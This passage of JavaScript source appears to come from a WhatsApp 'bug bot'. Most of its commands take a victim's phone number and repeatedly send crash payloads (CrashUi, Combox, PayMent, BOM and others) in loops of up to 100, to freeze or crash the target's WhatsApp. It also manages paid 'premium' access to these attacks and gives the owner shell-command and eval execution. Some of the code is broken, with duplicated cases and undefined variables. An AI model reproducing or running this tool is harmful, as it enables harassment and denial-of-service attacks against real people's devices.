                            body: `𝕯𝖊𝖛𝖎𝖑 𝖆𝖉𝖎𝖔𝖘`,
                            thumbnailUrl: pic ,
                            sourceUrl: 'https://whatsapp.com/channel/0029Vajz4XmCnA7pBowZQ53h',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: zets
                })
                break
// 𝐛𝐮𝐠 𝐩𝐥𝐮𝐬 𝐧𝐮𝐦𝐛𝐞𝐫
case 'blackout': case 'chaos': case 'erase': case 'corrupt': case 'hauntnet': case 'shadowrun' :  {
if (!isOwner) return reply(`*YOU ARE NOT A PREMIUM MEMBER DIMWIT*`)
if (!q) return reply(`Example: ${prefix + command} 254###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝐀𝐙𝐑𝐀𝐄𝐋 𝐈𝐒 𝐎𝐍 𝐈𝐓 𝐒𝐈𝐑 💀")
for (let i = 0; i < 70; i++) {
await Bugnew(target, cct = true, ptcp = true)
await Bugnew(target, true)
await Bugnew(target, cct = true, ptcp = true)
await BugUi(target, true)
await Bugnew(target, cct = true, ptcp = true)
await BugUi(target, true)
await Bugnew(target, true)
await BugUi(target, cct = true, ptcp = true)
await Bugnew(target, true)
await BugUi(target, cct = true, ptcp = true)
await BugUi(target, cct = true, ptcp = true)
await Bugnew(target, cct = true, ptcp = true)
}
reply(`
𝙃𝙀𝙇𝙇𝙊 𝙎𝙄𝙍 𝐀𝐃𝐈𝐎𝐒 𝙃𝘼𝙎 𝘿𝙀𝙇𝙄𝙑𝙀𝙍𝙀𝘿\n𝗧𝗼 : ${target}\n𝙐𝙎𝙄𝙉𝙂 : ${command}\n 𝙔𝙊𝙐 𝘾𝘼𝙉 𝙏𝙀𝙓𝙏 𝙏𝙃𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 𝙁𝙊𝙍 𝘾𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙏𝙄𝙊𝙉\n𝙃𝙊𝙇𝘿 𝙁𝙊𝙍 3 𝙈𝙄𝙉𝙐𝙏𝙀𝙎
   `)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: zets
})
}
break
case "self": {
if (!isCreator) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
ZoO.public = false
reply("*𝗫-𝗔𝗦𝗧𝗥𝗔𝗟 𝗠𝗘𝗠𝗔𝗦𝗨𝗞𝗜 𝗠𝗢𝗗𝗘 𝗦𝗘𝗟𝗙*")
}
break
case "addown":
if (!isCreator && !isOwner) return reply(`*\`LU BUKAN CREATOR BEGO\`*`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ZoO.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./Databases/database/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case 'chatgpt': {
    if (!text) {
        reply('Please ask me something!');
        return;
    }

    try {
        const apiUrl = `https://api.davidcyriltech.my.id/ai/chatbot?query=${encodeURIComponent(text)}`;
        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        if (jsonData.success && jsonData.result) {
            reply(jsonData.result); 
        } else {
            reply('Failed to fetch response from the API. Please try again later.');
        }
    } catch (error) {
        console.error('Error fetching API response:', error);
        reply('An error occurred while fetching the AI response. Please try again later.');
    }
    break;
}
case "delown":
if (!isCreator && !isOwner) return reply(`*\`LU BUKAN CREATOR BEGO\`*`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./Databases/database/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isCreator) return reply(`*\`LU SIAPA NJINKK?\`*`)
if (!args[0]) return reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZoO.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
Premium.push(prrkek)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`*\`SUKSES MENJADI MURBUG!!\`*`)
}
break
case "delprem":{
if (!isCreator) return reply(`*\`LU SIAPA NJINKK?\`*`)
if (!args[0]) return reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
m4 = Premium.indexOf(ya)
Premium.splice(m4, 1)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`*\`MAAF ANDA TIDAK LAGI MENJADI MURBUG!!\`*`)
}
break
case "x-tag": {
if (!isGroup) return reply(`*\`KHUSUS DIDALAM GRUP!!\`*`)
if (!isCreator) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
if (!m.quoted && !text) return reply(`*\`TEKSNYA MANA??\`*`)
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
ZoO.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case 'nightmare': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 30; i++) {
await Combox(target)
await CrashUi(target)
await f19(target)
await PayMent(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'combox': case "asteroid": case "darkmeter": {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 100; i++) {
await Combox2(target, jumlah)
await Combox3(target, jumlah)
await Combox2(target, jumlah)
await Combox3(target, jumlah)
await Combox2(target, jumlah)
await Combox3(target, jumlah)
await Combox2(target, jumlah)
await Combox3(target, jumlah)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'dectonic': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'nebula': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target, Null)
await f19(target, Null)
await PayMent(target, Null)
await combox(target) 
await combox2(target) 
await Combox(target)
await f9(target, Null)
await CrashUi(target, Null)
await f19(target, Null)
await PayMent(target, Null)
await Combox(from, jumlah) 
await combox2(target) 
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'cosmic': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'satanic': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(target) 
await combox2(target) 
await f7(target)
await Combox(target)
await f9(target)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(target) 
await Combox2(target) 
await f7(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'primordial': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target)
await CrashUi(target, null)
await f19(target)
await PayMent(target)
await combox2(target) 
await Combox3(from, jumlah)
await f8(target)
await Combox(target)
await f9(target)
await CrashUi(target, null)
await f19(target)
await PayMent(target)
await combox2(target) 
await Combox3(from, jumlah)
await f8(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'behemoth': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await f7(target)
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await f7(target)
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'lucifer': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
await f7(target)
await f8(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
await f7(target)
await f8(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'dark-angel': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await OLDLOC(target, Null) 
await newgalaxy(target)
await BOM(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await OLDLOC(target, Null) 
await newgalaxy(target)
await BOM(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'darknes': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await newgalaxy(target)
await Wow(target)
await BOM(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await newgalaxy(target)
await Wow(target)
await BOM(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'darkmeter': {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < 30; i++) {
await Combox(target)
await OLDLOC(target, Null)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await newgalaxy(target)
await Wow(target)
await BOM(target)
await Combox(target)
await f9(target)
await CrashUi(target, null)
await f19(target)
await PayMent(target)
await combox2(target) 
await Combox3(from, jumlah)
await f8(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'bug-loc': case "bug-ui": case "bug-delay": case "bug-docu": case "bug-system": {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
jumlah = qtext.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
for (let i = 0; i < jumlah; i++) {
await Combox(target)
await f9(target)
await CrashUi(target)
await f19(target)
await PayMent(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'hard': {
if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await Combox3(from, jumlah)
await f19(target)
await PayMent(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
break

case 'system': {
if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
reply("𝗜𝗦 𝗜𝗡 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗢𝗙 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗜𝗡𝗚 𝗔 𝗕𝗨𝗚")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await f19(target)
await PayMent(target)
await combox2(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
break

default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return ZoO.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return ZoO.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
ZoO.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
ZoO.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return ZoO.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return ZoO.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
ZoO.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})